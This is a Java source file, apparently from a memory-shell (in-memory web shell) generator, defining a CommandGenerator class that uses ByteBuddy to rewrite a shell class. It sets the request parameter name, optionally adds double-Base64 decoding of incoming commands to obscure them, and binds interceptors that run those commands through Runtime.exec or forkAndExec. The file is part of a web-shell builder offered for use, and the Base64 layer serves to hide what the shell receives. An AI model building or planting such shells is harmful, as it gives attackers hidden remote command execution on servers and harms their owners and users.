package com.reajason.javaweb.memshell.generator.command;

import com.reajason.javaweb.buddy.MethodCallReplaceVisitorWrapper;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.description.modifier.Ownership;
import net.bytebuddy.description.modifier.Visibility;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class CommandGenerator extends ByteBuddyShellGenerator<CommandConfig> {

    public CommandGenerator(ShellConfig shellConfig, CommandConfig commandConfig) {
        super(shellConfig, commandConfig);
    }

    @Override
    public DynamicType.Builder<?> getBuilder() {
        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(shellToolConfig.getShellClass())
                .field(named("paramName"))
                .value(shellToolConfig.getParamName());

        if (CommandConfig.Encryptor.DOUBLE_BASE64.equals(shellToolConfig.getEncryptor())) {
            builder = builder
                    .visit(MethodCallReplaceVisitorWrapper.newInstance("getParam",
                            shellToolConfig.getShellClassName(), ShellCommonUtil.class.getName()))
                    .defineMethod("base64DecodeToString", String.class, Visibility.PUBLIC, Ownership.STATIC)
                    .withParameters(String.class)
                    .throwing(Exception.class)
                    .intercept(FixedValue.nullValue())
                    .visit(Advice.to(ShellCommonUtil.Base64DecodeToStringInterceptor.class).on(named("base64DecodeToString")))
                    .visit(Advice.to(DoubleBase64ParamInterceptor.class).on(named("getParam")));
        }
        if (CommandConfig.ImplementationClass.RuntimeExec.equals(shellToolConfig.getImplementationClass())) {
            builder = builder.visit(Advice.withCustomMapping()
                    .bind(TemplateAnnotation.class, shellToolConfig.getTemplate())
                    .to(RuntimeExecInterceptor.class)
                    .on(named("getInputStream")));
        } else if (CommandConfig.ImplementationClass.ForkAndExec.equals(shellToolConfig.getImplementationClass())) {
            builder = builder.visit(Advice.withCustomMapping()
                    .bind(TemplateAnnotation.class, shellToolConfig.getTemplate())
                    .to(ForkAndExecInterceptor.class)
                    .on(named("getInputStream")));
        }
        return builder;
    }
}